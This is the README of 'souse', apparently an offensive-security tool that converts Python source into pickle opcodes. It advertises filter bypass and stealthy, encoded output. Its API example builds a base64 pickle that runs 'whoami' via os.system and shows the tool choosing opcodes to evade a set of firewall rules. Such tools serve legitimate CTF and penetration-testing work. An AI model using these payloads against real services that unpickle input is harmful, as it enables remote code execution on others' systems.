# souse
A tool for converting Python source code to opcode(pickle)

[中文版](./README_CN.md)

## 1. help

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/help.png" width="600">

## 2. Key Features

- **🚀 Intelligent Reconstruction**: Automatically reconstructs non-pickleable Python source code into fully compatible opcode sequences.
- **✨ Automated Builtins**: Built-in functions like `open`, `eval`, and `getattr` are recognized automatically—no manual import needed.
- **🛡️ Advanced Bypass**: Auto bypass complex limitations (`R`, `o`, `i`, ...)
- **⚡ Stealthy Optimization**: Automatically optimizes generated opcodes using `pickletools` for minimal size and maximum stealth.
- **📦 Multi-Functional Transfer**: Flexible encoding support (Base64, Hex, URL) and custom transformation sequences.
- **📝 Precise Debugging**: Pinpoints errors with full source code context and syntax highlighting.
- **💡 API Support**: Convert Python source code to opcode(pickle) via API.

## 2. usage
### 2.1 CLI
`./test/` has some example codes for souse.py.

#### 2.1.1 case 1

source code:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1.png" width="300">

opcode:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1-s.png" width="600">

#### 2.1.2 case 2

source code:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2.png" width="300">

opcode:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2-s.png" width="600">

#### 2.1.3 case 3

transfer opcode:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-3.png" width="600">

supported:
- [x] base64_encode
- [x] hex_encode
- [x] url_encode

#### 2.1.4 test code

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/test.png" width="400">

### 2.2 API
example:

```py
In [1]: import souse

In [2]: exp = "from os import system\nsystem('whoami')"

In [3]: souse.API(exp, optimized=True, transfer="b64").generate()
Out[3]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [4]: import base64

In [5]: souse.API(exp, optimized=True, transfer=base64.b64encode).generate()
Out[5]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [6]: souse.API(exp, optimized=True, transfer=[bytes.decode, str.encode, base64.b64encode]).generate()
Out[6]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [7]: import pickle

In [8]: firewall_rules = {
    ...:     "V": "*",
    ...:     "I01": "*",
    ...:     "I": "100",
    ...:     "R": "*"
    ...: }

In [9]: souse.API(exp, optimized=True, transfer=pickle.loads, firewall_rules=firewall_rules).generate()
[*] choice o to bypass rule: {'R': '*'}
[*] choice S to bypass rule: {'V': '*'}
macr0phag3
Out[9]: 0
```

## 3. TODO
- [x] support for nested expressions
- [x] opcode bypass supported
	- [x] auto bypass basic limitation（`V`、`S`、`I`、...）
	- [x] auto bypass complex limitation（`R`、`o`、`i`）
	- [x] auto bypass `stb` limitation (via `setattr`)
- [x] Intelligent Import Transformation (Lazy Import)
- [x] Intelligent Attribute Assignment Transformation (By `getattr`/`setattr`)
- [x] Converted code output support
- [x] value bypass supported
	- [x] number
- [x] API
- [x] `pip install` supported
- [x] Contextual source error reporting
- [x] Intelligent Subscript Downgrade (`u` -> `__setitem__`)
- [x] Automated Builtin recognition

## ## Others
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" width="500">

[![Stargazers over time](https://starchart.cc/Macr0phag3/souse.svg)](https://starchart.cc/Macr0phag3/souse)
